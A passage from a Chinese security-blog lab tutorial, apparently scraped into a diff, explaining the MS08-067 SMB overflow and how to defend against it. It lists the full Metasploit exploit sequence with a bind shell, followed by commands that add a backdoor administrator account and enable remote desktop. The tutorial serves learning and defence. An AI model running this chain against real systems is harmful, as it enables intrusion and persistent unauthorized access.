+generic/shell_bind_tcp”。</p>
+
+<ul>
+<li><strong>反弹shell失败</strong> ：set payload generic/shell_reverse_tcp</li>
+<li><strong>反弹shell成功</strong> ：set payload generic/shell_bind_tcp</li>
+</ul>
+
+<p>如果仍然失败，可能需要换其他XP或2003系统进行尝试。祝好运~</p>
+
+<p><a href="https://img.it610.com/image/info8/cbc63dcc4eef4c38aaffe9c64789aa31.jpg"><img src="https://img.it610.com/image/info8/cbc63dcc4eef4c38aaffe9c64789aa31.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第22张图片" /></a></p>
+
+<hr />
+
+<h2 id="2-漏洞成因">2.漏洞成因</h2>
+
+<p>如果想了解该漏洞的原理知识，推荐以下三篇文章，后续作者也需要深入去分析各种漏洞的原代码。</p>
+
+<ul>
+<li><a href="https://www.cnblogs.com/justforfun12/p/5239941.html">https://www.cnblogs.com/justforfun12/p/5239941.html</a></li>
+<li><a href="https://bbs.pediy.com/thread-251219.htm">https://bbs.pediy.com/thread-251219.htm</a></li>
+<li><a href="https://www.freebuf.com/vuls/203881.html">https://www.freebuf.com/vuls/203881.html</a></li>
+</ul>
+
+<p>MS08-067漏洞是通过MSRPC over
+SMB通道调用Server服务程序中的NetPathCanonicalize函数时触发的，而NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误，造成可被利用实施远程代码执行。</p>
+
+<pre><code>所谓路径规范化，就是将路径字符串中的【/】转换为【\】，同时去除相对路径【.\】和【..\】。如：
+**/*/./**   =&gt;  **\*\**
+**\*\..\**  =&gt;  **\**
+</code></pre>
+
+<p>在路径规范化的操作中，服务程序对路径字符串的地址空间检查存在逻辑漏洞。攻击者通过精心设计输入路径，可以在函数去除【…\】字符串时，把路径字符串中内容复制到路径串之前的地址空间中（低地址），达到覆盖函数返回地址，执行任意代码的目的。</p>
+
+<p>这里通过IDA
+Pro打开c:\windows\system32\netapi32.dll，找到漏洞所在的NetpwPathCanonicalize函数并双击。通过观察其流程图CFG可知，此函数并没有直接进行输入路径和规范化，而是调用了下级函数CanonicalizePathName来进行路径整理，将待整理的路径字符串进行规范化，然后再保存到预先分配的输出路径缓冲区buffer中，最终造成缓冲区溢出漏洞。</p>
+
+<p><a href="https://img.it610.com/image/info8/dd7f4fa76efc463f98406614ebb6e1d9.jpg"><img src="https://img.it610.com/image/info8/dd7f4fa76efc463f98406614ebb6e1d9.jpg" alt="\[网络安全自学篇\]
+五十九.Windows漏洞利用之MS08-067远程代码执行漏洞复现及shell深度提权_第23张图片" /></a></p>
+
+<hr />
+
+<h1 id="五-总结">五.总结</h1>
+
+<p>写到这里，这篇文章就介绍结束了，通过本次实验我们复现了MS08-067远程代码执行漏洞，涉及漏洞发现、验证漏洞、利用漏洞的完整过程，并利用Metasploit工具进行shell反弹及深入理解，希望对您有所帮助。如何进行防御呢？一方面关闭相关端口、安装杀毒软件和补丁，另一方面在防火墙中进行流量监测，主要是针对数据包中存在的形如&rdquo;<br />
+** \ … \ … \ *&ldquo;这样的恶意路径名进行检测，最为保险的方法是使用pcre正则去匹配。</p>
+
+<p>本次实验的完整命令：</p>
+
+<pre><code># 端口查询
+nmap -n -p 445 --script smb-vuln-ms08-067 192.168.44.135 --open
+
+# 查找漏洞利用模块
+msfconsole
+search ms08-067
+
+# 漏洞利用
+use exploit/windows/smb/ms08_067_netapi
+show options
+show targets
+
+# 设置相关配置信息
+set RHOST 192.168.44.135
+set RPORT 445
+set payload generic/shell_bind_tcp
+set LHOST 192.168.44.136
+set target 0
+show options
+
+# 反弹shell
+exploit
+session 1
+ipconfig
+pwd
+
+# 目标主机文件操作
+cd ..
+mkdir hacker
+dir
+cd hacker
+echo eastmount&gt;test.txt
+sysinfo
+
+# 深度提权及远程连接操作
+net user hacker 123456 /add 
+net localgroup administrators hacker /add
+echo reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f &gt; C:\WINDOWS\system32\3389.bat &amp;&amp; call 3389.bat
+netstat -an
+rdesktop 192.168.44.135
+</code></pre>
+
+<p>希望这系列文章对您有所帮助，真的感觉自己技术好菜，要学的知识好多。这是第58篇原创的安全系列文章，从网络安全到系统安全，从木马病毒到后门劫持，从恶意代码到溯源分析，从渗透工具到二进制工具，还有Python安全、顶会论文、黑客比赛和漏洞分享。未知攻焉知防，人生漫漫其路远兮，作为初学者，自己真是爬着前行，感谢很多人的帮助，继续爬着，继续加油！</p>
+
+<p><strong>欢迎大家讨论，是否觉得这系列文章帮助到您！任何建议都可以评论告知读者，共勉。</strong></p>
+
+<p>(By:Eastmount 2020-03-14 周末下午5点写于贵阳 <a href="http://blog.csdn.net/eastmount/">http://blog.csdn.net/eastmount/</a> )</p>
+
+<hr />
+
+<p><strong>参考文献：</strong><br />
+[1] <a href="https://docs.microsoft.com/zh-cn/security-">https://docs.microsoft.com/zh-cn/security-</a>
+updates/Securitybulletins/2008/MS08-067<br />
+[2] MS08-067利用 - s0mor<br />
+[3] MS08-067 远程执行代码 漏洞复现 - feizianquan<br />
+[4] MS08-067远程溢出漏洞（CVE-2008-4250）- Waldo_cuit<br />
+[5] MS08-067复现与简单分析 - 看雪论坛 有毒<br />
+[6] ms08-067漏洞复现与利用 - 张德亮<br />
+[7] CVE-2019-0708，MS17-010，MS08-067漏洞复现 - dazhuanlan<br />
+[8] Metasploit入门到精通 - i春秋视频<br />
+[9] Metasploitable渗透测试实战——Windows漏洞 MS08-067复现 - HsinTsao<br />
+[10] MS08_067漏洞学习研究 - justforfun12<br />
+<a href="https://www.bilibili.com/video/av79638906">https://www.bilibili.com/video/av79638906</a><br />
+[11] MS08-067漏洞原理及详尽分析过程 - FreeBuf Dhakkan<br />
+[12] 135、137、138、139和445端口 - 谢公子大佬</p>
+
+<hr />
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
